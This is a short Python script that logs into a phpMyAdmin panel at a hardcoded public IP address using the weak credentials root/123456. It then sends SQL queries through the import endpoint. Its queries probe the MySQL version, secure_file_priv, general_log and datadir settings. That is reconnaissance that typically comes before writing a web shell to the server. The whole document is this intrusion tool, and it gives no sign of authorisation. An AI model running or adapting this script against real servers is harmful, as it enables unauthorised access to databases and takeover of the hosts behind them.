#!/usr/bin/env python3
"""phpMyAdmin SQL执行v2"""
import urllib.request, http.cookiejar, ssl, re, sys, urllib.parse

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
B = "http://124.71.142.158:9096/phpmyadmin"

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders = [("User-Agent","Mozilla/5.0")]

def login():
    r = op.open(f"{B}/", timeout=10)
    html = r.read().decode("utf-8","ignore")
    token = re.search(r'name="token" value="([a-f0-9]{32})"', html).group(1)
    data = f"pma_username=root&pma_password=123456&server=1&token={token}".encode()
    op.open(urllib.request.Request(f"{B}/index.php", data=data), timeout=10).read()
    r = op.open(f"{B}/index.php", timeout=10)
    return r.read().decode("utf-8","ignore")

def get_token():
    r = op.open(f"{B}/index.php", timeout=10)
    html = r.read().decode("utf-8","ignore")
    m = re.search(r'name="token" value="([a-f0-9]{32})"', html)
    return m.group(1) if m else ""

def exec_sql(sql, db="mysql"):
    token = get_token()
    params = {
        "token": token,
        "sql_query": sql,
        "sql_delimiter": ";",
        "show_query": "1",
        "db": db,
        "server": "1",
        "ajax_request": "true",
        "import_type": "query",
    }
    body = urllib.parse.urlencode(params).encode()
    try:
        r = op.open(urllib.request.Request(f"{B}/import.php", data=body), timeout=15)
        resp = r.read().decode("utf-8","ignore")
        # 提取消息
        m = re.findall(r'class="(?:success|error)"[^>]*>(.{0,150})', resp, re.S)
        if m:
            return " | ".join(x.strip()[:100] for x in m[:3])
        if "message" in resp:
            m2 = re.findall(r'"message":"([^"]{0,150})"', resp)
            if m2: return " | ".join(m2[:3])
        return resp[:200]
    except Exception as e:
        return f"ERR:{str(e)[:60]}"

login()
print("== 登录OK ==", flush=True)
print("VERSION:", exec_sql("SELECT VERSION();")[:120], flush=True)
print("secure_file_priv:", exec_sql("SHOW VARIABLES LIKE 'secure_file_priv';")[:150], flush=True)
print("general_log:", exec_sql("SHOW VARIABLES LIKE 'general_log%';")[:150], flush=True)
print("datadir:", exec_sql("SHOW VARIABLES LIKE 'datadir';")[:150], flush=True)
